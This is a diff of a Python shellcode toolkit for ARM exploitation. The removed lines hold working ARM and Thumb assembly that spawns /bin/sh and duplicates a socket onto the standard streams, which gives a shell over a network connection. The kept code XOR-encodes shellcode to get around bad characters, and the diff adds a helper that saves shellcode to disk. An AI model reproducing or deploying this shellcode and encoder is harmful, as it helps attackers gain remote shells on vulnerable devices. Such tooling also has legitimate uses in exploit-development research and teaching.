@@ -2,8 +2,9 @@
 import os
 import sys
 import tempfile
+from socket import ntohs
 
-__VERSION__ = '$0.0.2'
+__VERSION__ = '$0.0.3'
 __AUTHOR__  = 'alex.park'
 
 # Assembler 
@@ -218,44 +219,6 @@ def checkBadChar(sc, bc=[0x00, 0x0a]):
 
     return bcs
 
-######################
-## ARM Mode Shellcodes
-######################
-
-# /bin/sh 
-def ARM_SH(binsh='/bin/sh'):
-    sc = """
-    adr r0, bin_sh_1
-    mov r2, #0
-    push {r0, r2}
-    mov r1, sp
-    svc (0x900000+ 11)
-bin_sh_1:
-    .asciz "%s"
-    """ % (binsh) # sometimes we have to change to specific things like id
-    return sc
-
-# dup() in ARM Mode
-def ARM_DUP(sock=4):
-    sc = """
-    mov r9, #%s
-    mov r8, #2
-loop_2:
-    mov r0, r9
-    mov r1, r8
-    svc (0x900000+ 63)
-    adds r8, #-1
-bpl loop_2
-    """ % (sock)
-
-    return sc
-
-# dupsh()
-def ARM_DUPSH(sock=4, binsh='/bin/sh'):
-    sc = ARM_DUP(sock)
-    sc += ARM_SH(binsh)
-    return sc
-
 def MakeXorShellcode(sc, isThumb=False):
     key = findXorKey(sc)
     if key == -1:
@@ -271,50 +234,13 @@ def MakeXorShellcode(sc, isThumb=False):
 
     return CompileSC(xorenc, isThumb=isThumb)
 
-########################
-## Thumb Mode Shellcodes
-########################
-
-# /bin/sh
-def ARM_THUMB_SH(sh='/bin/sh'):
-    sc = """
-    mov r0, pc
-    add r0, #10
-    movs r2, #0
-    movs r7, #(0+ 11)
-    push {r0, r2}
-    mov r1, sp
-    svc 1
-bin_sh_1:
-    .asciz "%s\x00"
-    """ % (sh)
-    return sc
-
-def ARM_THUMB_DUP(sock=4):
-    sc = """
-    movs r1, #3
-    movs r7, #(0+ 63)
-    sub r2, r2, r2
-    movs r5, #%s
-loop_2:
-    mov  r0, r5
-    sub  r1, r1, #1
-    svc  1
-    cmp  r1, r2
-    bne  loop_2
-    """ % (sock)
-    return sc
-
-def ARM_THUMB_DUPSH(sock=4, sh='/bin/sh'):
-    sc = ARM_THUMB_DUP(sock)
-    sc += ARM_THUMB_SH(sh)
-    return sc
-
-# Placeholder 
-def ARM_PLACEHOLDER():
-    sc = """
-    """
-    return sc
+def saveShellcode(fn, sc):
+    try:
+        f = open(fn, 'w')
+        f.write(sc)
+        f.close()
+    except:
+        SYSERR("Failed to save the shellcode on disk")
 
 def Test():
     # ARM
